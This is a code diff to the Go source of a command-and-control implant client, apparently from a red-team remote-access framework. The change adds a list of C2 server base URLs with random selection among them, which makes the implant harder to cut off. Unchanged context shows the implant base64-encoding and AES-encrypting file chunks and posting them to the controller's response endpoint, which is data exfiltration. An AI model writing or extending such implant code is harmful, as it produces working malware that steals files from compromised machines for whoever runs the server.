@@ -23,6 +23,7 @@ import (
 type C2Default struct {
 	HostHeader     string
 	BaseURL        string
+	BaseURLs       []string
 	Interval       int
 	Commands       []string
 	ExchangingKeys bool
@@ -46,11 +47,23 @@ func (c *C2Default) SetHeader(newHeader string) {
 }
 
 func (c C2Default) URL() string {
-	return c.BaseURL
+	if len(c.BaseURLs) == 0 {
+		return c.BaseURL
+	} else {
+		return c.getRandomBaseURL()
+	}
+}
+
+func (c *C2Default) getRandomBaseURL() string {
+	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
 }
 
 func (c *C2Default) SetURL(newURL string) {
 	c.BaseURL = newURL
+}
+
+func (c *C2Default) SetURLs(newURLs []string) {
+	c.BaseURLs = newURLs
 }
 
 func (c C2Default) SleepInterval() int {
@@ -426,7 +439,6 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		tResp := structs.TaskResponse{}
 		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
 		dataToSend, _ := json.Marshal(tResp)
-		//resp := c.PostResponse(task, string(encmsg))
 
 		endpoint := fmt.Sprintf("api/v1.2/responses/%d", task.ID)
 		resp := c.htmlPostData(endpoint, dataToSend)
@@ -452,7 +464,6 @@ func (c *C2Default) encryptMessage(msg []byte) []byte {
 func (c *C2Default) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
 	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
-	log.Println("Length of b64 decoded string ", len(decMsg))
 	return crypto.AesDecrypt(key, decMsg)
 }
 
